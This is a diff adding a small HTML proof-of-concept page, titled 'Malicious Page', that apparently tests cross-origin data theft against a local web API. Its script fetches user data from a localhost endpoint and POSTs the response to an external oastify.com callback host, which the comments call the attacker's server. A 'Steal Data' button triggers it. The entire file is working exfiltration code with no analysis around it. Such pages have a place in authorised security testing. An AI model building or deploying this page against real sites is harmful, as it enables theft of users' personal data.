@@ -1,0 +1,34 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Page</title>
+    <script>
+        function stealData() {
+            fetch("http://localhost:5187/api/user/userdata", {
+                method: "GET"
+            })
+                .then(response => response.text())
+                .then(data => {
+                    
+                    console.log("Stolen Data:", data); // Logs stolen data to console
+                    document.getElementById("output").innerText = data;
+                    debugger;
+                    // Send stolen data to attacker's server
+                    fetch("http://c0d365qte651t87d17ggx44zvq1ip8dx.oastify.com/steal", {
+                        method: "POST",
+                        body: data,
+                    });
+                })
+                .catch(error => console.error("Error:", error));
+        }
+    </script>
+</head>
+
+<body>
+    <h2>Click the button to steal user data</h2>
+    <button onclick="stealData()">Steal Data</button>
+    <p id="output"></p>
+</body>
+
+</html>
